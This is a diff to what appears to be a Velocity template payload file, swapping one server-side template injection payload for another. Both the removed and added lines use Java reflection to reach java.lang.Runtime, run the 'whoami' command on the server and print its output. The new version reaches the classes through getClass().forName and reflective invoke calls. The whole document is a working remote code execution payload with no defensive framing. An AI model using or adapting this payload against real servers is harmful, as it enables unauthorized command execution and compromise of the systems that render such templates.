@@ -1,8 +1,14 @@
-#set($str=$class.inspect("java.lang.String").type)
-#set($chr=$class.inspect("java.lang.Character").type)
-#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
-$ex
-#set($out=$ex.getInputStream())
+#set ($exp="exp")
+#set ($n=1)
+#set ($a=[])
+#set ($arr=$a.getClass().forName("java.util.Arrays"))
+#set ($num=$n.getClass().forName("java.lang.Integer"))
+#set ($str=$exp.getClass().forName("java.lang.String"))
+#set ($chr=$exp.getClass().forName("java.lang.Character"))
+#set ($a=$exp.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("whoami"))
+$a.waitFor()
+#set ($out=$a.getInputStream())
+
 #foreach($i in [1..$out.available()])
 $str.valueOf($chr.toChars($out.read()))
 #end
